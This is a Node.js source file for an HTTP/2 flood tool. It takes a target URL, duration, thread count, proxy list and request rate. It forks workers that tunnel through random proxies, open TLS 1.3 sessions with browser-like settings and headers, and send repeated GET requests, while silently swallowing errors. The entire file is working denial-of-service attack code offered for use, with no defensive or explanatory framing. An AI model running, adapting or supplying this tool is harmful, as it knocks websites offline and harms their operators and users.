const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    tls = require('tls'),
    net = require('net'),
    os = require('os'),
    request = require('request'),
    cluster = require('cluster'),
    userAgents = require('user-agents'),
    crypto = require('crypto');

const errorHandler = error => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const cipherList = [
    'TLS_AES_128_CCM_8_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_AES_128_GCM_SHA256',
];

const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
];

function randomIp() {
    return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
}

const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const proxyFile = process.argv[5];
const rps = parseInt(process.argv[6], 10);
const userAgent = process.argv[8];
const cookie = process.argv[7];

if (!target || !time || !threads || !proxyFile || isNaN(rps)) {
    console.error(`Usage: node ${process.argv[1]} url time threads proxy.txt rps`);
    process.exit(1);
}

if (!/^https?:\/\//i.test(target)) {
    console.error('Target URL must include http:// or https://');
    process.exit(1);
}

const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
const parsedUrl = url.parse(target);

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 100;

if (cluster.isMaster) {
    console.log(`Starting attack on ${target}`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setInterval(() => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`RAM usage exceeded ${MAX_RAM_PERCENTAGE}%, restarting...`);
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }

            setTimeout(() => {
                for (let i = 0; i < threads; i++) {
                    cluster.fork();
                }
            }, RESTART_DELAY);
        }
    }, 5000);

    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(flood, 0);
}

function flood() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const agent = new http.Agent({
        host: proxy[0],
        port: proxy[1],
        keepAlive: true,
        keepAliveMsecs: 5000,
    });

    const requestOptions = {
        agent: agent,
        method: 'CONNECT',
        path: `${parsedUrl.host}:443`,
        headers: {
            'Host': parsedUrl.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
    };

    const conn = http.request(requestOptions);

    conn.on('connect', (res, socket) => {
        const tlsSocket = tls.connect({
            host: parsedUrl.host,
            servername: parsedUrl.host,
            socket: socket,
            ciphers: cipherList.join(':'),
            sigalgs: sigalgs.join(':'),
            secureProtocol: 'TLSv1_3_method',
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
        });

        tlsSocket.setKeepAlive(true);

        const client = http2.connect(parsedUrl.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
            },
        });

        client.on('connect', () => {
            setInterval(() => {
                for (let i = 0; i < rps; i++) {
                    const headers = {
                        ':method': 'GET',
                        ':authority': parsedUrl.host,
                        ':scheme': 'https',
                        ':path': parsedUrl.path,
                        'user-agent': userAgent,
                        'cookie': cookie,
                        'sec-fetch-site': 'none',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-user': '?1',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                    };
                    client.request(headers).end();
                }
            }, 1000);
        });

        client.on('error', (error) => {
            if (error.code !== 'ERR_HTTP2_GOAWAY_SESSION') {
                client.destroy();
                tlsSocket.destroy();
                socket.destroy();
            }
        });

        client.on('close', () => {
            client.destroy();
            tlsSocket.destroy();
            socket.destroy();
        });
    });

    conn.on('error', () => {
        conn.destroy();
    });

    conn.end();
}
